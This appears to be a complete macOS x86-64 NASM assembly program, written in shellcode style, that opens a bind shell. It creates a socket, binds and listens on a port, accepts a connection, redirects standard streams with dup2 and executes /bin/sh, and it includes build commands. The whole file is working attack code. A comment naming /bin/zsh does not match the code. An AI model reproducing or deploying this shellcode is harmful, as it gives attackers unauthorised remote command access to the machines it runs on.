;	Executable name	:	bind_shell
;	Version			:	1.0
;	Author			: 	p1tsi
;	Description		:	This program create a bind shell
;
;	Build:
;		nasm -f macho64 custom_shell_cmd.asm
;		ld -L /Library/Developer/CommandLineTools/SDKs/MacOSX.sdk/usr/lib -l System -o custom_shell_cmd custom_shell_cmd.o
;

bits 64

global _main

_main:
    
    ; create socket
    ; 97	AUE_SOCKET	ALL	{ int socket(int domain, int type, int protocol); }
    push    0x2
    pop     rdi             ; domain
    push    0x1
    pop     rsi             ; type
    xor     rdx, rdx        ; protocol 

    push    0x61
    pop     rax
    bts     rax, 25
    syscall

    mov r9, rax

    ; bind socket
    ; 104	AUE_BIND	ALL	{ int bind(int s, caddr_t name, socklen_t namelen) NO_SYSCALL_STUB; }
    mov     rdi, r9            ; s 

    ; Prepare caddr_t struct on the stack
    xor     rbx, rbx
    push    rbx                 
    mov     esi, 0x5c110201
    dec     esi 
    push    rsi
    push    rsp
    pop     rsi                 ; name

    ; socklen_t
    push    0x10
    pop     rdx                 ; namelen
    
    push    0x68
    pop     rax
    bts     rax, 25
    syscall

    ; listen
    ; 106	AUE_LISTEN	ALL	{ int listen(int s, int backlog) NO_SYSCALL_STUB; }
    xor     rdx, rdx
    push    rdx
    pop     rsi         ; backlog

    push    0x6a
    pop     rax
    bts     rax, 25
    syscall

    ; accept
    ; 404	AUE_ACCEPT	ALL	{ int accept_nocancel(int s, caddr_t name, socklen_t	*anamelen) NO_SYSCALL_STUB; }
    xor     rax, rax
    bts     rax, 2
    bts     rax, 4
    bts     rax, 7
    bts     rax, 8
    bts     rax, 25 
    syscall

    mov     r10, rax

    ; dup2
    ; 90	AUE_DUP2	ALL	{ int sys_dup2(u_int from, u_int to); }
    mov     rdi, r10    ; from
    
    ; for loop
    push    0x2
    pop     rsi         ; to

dup2_syscall:
    push    0x5a
    pop     rax
    bts     rax, 25
    syscall

    dec     rsi
    jns     dup2_syscall


    ; execve("/bin/zsh", NULL, NULL)
    mov     rbx, '/bin//sh'
    push    rbx       
    mov     rdi, rsp        ; fname
    xor     rsi, rsi        ; argp
    xor     rdx, rdx        ; envp   

    push    0x3b
    pop     rax
    bts     rax, 25
    syscall
